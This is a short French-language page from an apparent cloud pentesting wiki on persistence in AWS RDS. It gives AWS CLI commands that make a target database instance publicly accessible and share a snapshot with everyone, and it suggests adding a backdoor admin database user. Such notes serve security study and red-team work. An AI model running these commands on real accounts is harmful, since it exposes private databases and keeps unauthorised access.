# AWS - RDS Persistence

{{#include ../../../banners/hacktricks-training.md}}

## RDS

Pour plus d'informations, consultez :

{{#ref}}
../aws-services/aws-relational-database-rds-enum.md
{{#endref}}

### Rendre l'instance accessible publiquement : `rds:ModifyDBInstance`

Un attaquant disposant de cette autorisation peut **modifier une instance RDS existante pour activer l'accessibilité publique**.
```bash
aws rds modify-db-instance --db-instance-identifier target-instance --publicly-accessible --apply-immediately
```
### Créer un utilisateur admin dans la DB

Un attaquant pourrait simplement **créer un utilisateur dans la DB** donc même si le mot de passe de l'utilisateur principal est modifié, il **ne perd pas l'accès** à la base de données.

### Rendre le snapshot public
```bash
aws rds modify-db-snapshot-attribute --db-snapshot-identifier <snapshot-name> --attribute-name restore --values-to-add all
```
{{#include ../../../banners/hacktricks-training.md}}
